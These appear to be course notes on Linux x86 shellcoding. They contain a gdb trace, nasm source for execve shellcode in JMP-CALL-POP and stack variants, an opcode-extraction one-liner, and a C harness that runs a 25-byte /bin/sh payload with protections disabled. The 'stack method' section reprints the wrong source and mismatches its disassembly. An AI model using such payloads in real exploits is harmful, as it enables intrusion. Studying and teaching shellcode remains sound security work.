   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
=> 0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff5fc:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0xbffff604:	114 'r'	108 'l'	100 'd'	10 '\n'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'
0x0804a05a in code ()
(gdb) print /x $ecx
$2 = 0x0
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
=> 0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff5fc:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0xbffff604:	114 'r'	108 'l'	100 'd'	10 '\n'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'
0x0804a05c in code ()
(gdb) print /x $ecx
$4 = 0xbffff5fc
(gdb) c
Continuing.
Hello World
[Inferior 1 (process 572) exited normally]
Error while running hook_stop:
No frame selected.
(gdb) quit

Execve Shellcode JMP-CALL-POP Method:

man execve

EXECVE(2)                              Linux Programmer's Manual                             EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
		  
vim execve.nasm

; Filename: execve.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        jmp short call_shellcode


shellcode:

        pop esi

        xor ebx, ebx
        mov byte [esi +7], bl
        mov dword [esi +8], esi
        mov dword [esi +12], ebx


        lea ebx, [esi]

        lea ecx, [esi +8]

        lea edx, [esi +12]

        xor eax, eax
        mov al, 0xb
        int 0x80



call_shellcode:

        call shellcode
        message db "/bin/shABBBBCCCC"
	
./compile.sh execve
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

vim shellcode.c

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode 
Shellcode Length:  25
$ ps
  PID TTY          TIME CMD
13390 pts/0    00:00:00 bash
15474 pts/0    00:00:00 sh
15477 pts/0    00:00:00 ps

Execve Shellcode Stack Method:

./reverse.py "////bin/bash"
String length : 12
hsab : 68736162
/nib : 2f6e6962
//// : 2f2f2f2f

vim execve.nasm

; Filename: execve.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        jmp short call_shellcode


shellcode:

        pop esi

        xor ebx, ebx
        mov byte [esi +7], bl
        mov dword [esi +8], esi
        mov dword [esi +12], ebx


        lea ebx, [esi]

        lea ecx, [esi +8]

        lea edx, [esi +12]

        xor eax, eax
        mov al, 0xb
        int 0x80



call_shellcode:

        call shellcode
        message db "/bin/shABBBBCCCC"
	
./compile.sh execve-stack
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./execve-stack 
compile.sh  execve-stack       execve-stack.o  execve.o    shellcode
execve	    execve-stack.nasm  execve.nasm     reverse.py  shellcode.c
$ ps
  PID TTY          TIME CMD
13390 pts/0    00:00:00 bash
23037 pts/0    00:00:00 ps

objdump -d ./execve-stack -M intel

./execve-stack:     file format elf32-i386

Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	50                   	push   eax
 8048083:	68 2f 2f 6c 73       	push   0x736c2f2f
 8048088:	68 2f 62 69 6e       	push   0x6e69622f
 804808d:	89 e3                	mov    ebx,esp
 804808f:	50                   	push   eax
 8048090:	89 e2                	mov    edx,esp
 8048092:	53                   	push   ebx
 8048093:	89 e1                	mov    ecx,esp
 8048095:	b0 0b                	mov    al,0xb
 8048097:	cd 80                	int    0x80
 
objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

vim shellcode.c

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode 
Shellcode Length:  25

Video 28:
